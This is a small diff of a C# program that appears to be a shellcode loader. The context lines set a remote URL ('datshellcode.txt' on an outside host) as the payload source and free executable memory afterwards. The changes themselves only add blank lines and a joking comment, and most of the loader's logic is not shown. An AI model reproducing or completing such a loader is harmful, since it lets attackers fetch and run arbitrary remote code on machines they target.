@@ -62,6 +62,7 @@ namespace Code
 
 
             //OHAI! Put your URL here. Has to be a file.
+            
              
             var mattsHot = "http://4channel.biz/datshellcode.txt";
 
@@ -109,7 +110,7 @@ namespace Code
             {
                 VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
             }
-
+                // Insert dolphin for extra cuteness
             Console.ReadLine();
         }
     }
